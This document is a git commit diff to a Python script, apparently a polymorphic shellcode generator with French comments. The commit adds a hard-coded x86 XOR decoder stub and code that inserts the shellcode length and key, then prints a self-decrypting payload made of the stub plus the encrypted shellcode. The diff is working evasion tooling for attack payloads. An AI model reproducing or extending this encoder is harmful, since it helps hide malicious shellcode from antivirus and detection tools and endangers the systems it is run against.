b689ffdc269d1f5866858dab624b85718f8378c3
Alexy "OxyDe <46215222+OxyDeV2@users.noreply.github.com>
2023-06-13 17:44:06 +0200

    Work payload generator

--- chiffrement_xor.py
+++ chiffrement_xor.py
@@ -1,6 +1,8 @@
 from bytetohex import bytetohex
 from unsplitter import unsplitter
 
+decryptor = "\\xeb\\x11\\x5e\\x31\\xc9\\xb1\\shellcode_len\\x80\\x74\\x0e\\xff\\xor_key\\x80\\xe9\\x01\\x75\\xf6\\xeb\\x05\\xe8\\xea\\xff\\xff\\xff"
+
 def xor(shellcode, key, debug):
 
     # Conversion de la chaîne de caractères en bytes
@@ -17,6 +19,8 @@ def xor(shellcode, key, debug):
         # Parse du shellcode
         hex_shellcode = bytetohex(xored_shellcode)
         crypted_shellcode = unsplitter(hex_shellcode)
+        unsplitter_key = unsplitter(key)
+        unsplitter_key = unsplitter_key[1:]
 
 
     if debug == "1":
@@ -30,5 +34,12 @@ def xor(shellcode, key, debug):
         print("", end="")
 
         # - Resultat du polymorphisme - #
-    print("- Shellcode chiffré : ", crypted_shellcode, "\n- Taille : ",len(crypted_shellcode)/4," octets\n")
-
+    taille = len(crypted_shellcode) / 4
+    taille_sans_zero = str(int(taille))
+    print("- Shellcode chiffré : ", crypted_shellcode, "\n- Taille : ",taille_sans_zero," octets","\n- Clé : ", unsplitter_key)
+    print("\n ========== Payload Polymorphique-shellcode ==========")
+    taille_sans_zero_hex = hex(int(taille_sans_zero))
+    taille_sans_zero_hex = taille_sans_zero_hex[1:]
+    
+    payload = decryptor.replace("shellcode_len", taille_sans_zero_hex).replace("xor_key", unsplitter_key)
+    print("\n- Payload : ", payload + crypted_shellcode + "\n")
